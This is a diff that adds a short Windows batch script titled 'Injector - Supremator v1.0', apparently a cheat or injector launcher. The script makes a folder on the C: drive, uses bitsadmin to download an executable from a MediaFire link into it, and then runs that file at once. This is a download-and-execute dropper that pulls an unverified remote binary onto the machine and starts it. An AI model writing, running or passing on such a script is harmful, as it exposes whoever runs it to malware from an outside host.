@@ -1,0 +1,8 @@
+@echo off
+title Injector - Supremator v1.0
+cd c:\
+MD XXSuper
+cd XXSuper
+bitsadmin.exe /transfer "Supremator" https://download1082.mediafire.com/3zx2twticirg/vkd0vmd8qblar97/supremator.exe C:\XXSuper\supremator.exe
+supremator.exe
+exit
